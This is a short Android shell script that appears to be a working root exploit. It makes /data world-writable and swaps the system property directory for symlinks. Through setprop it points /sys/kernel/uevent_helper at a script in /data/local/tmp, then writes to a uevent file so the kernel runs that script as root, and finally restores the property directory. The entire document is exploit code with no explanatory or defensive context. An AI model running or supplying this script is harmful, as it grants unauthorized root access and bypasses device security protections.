#!/system/bin/sh
chmod 777 /data
chmod 777 /data/local/tmp/mkdevsh
cd /data
mv property property.org
mkdir property
ln -s /sys/kernel/uevent_helper property/.temp
setprop persist.sys.hoge /data/local/tmp/mkdevsh
ln -s /sys/class/mem/null/uevent property/.temp
setprop persist.sys.hoge change
rm -r property
mv property.org property


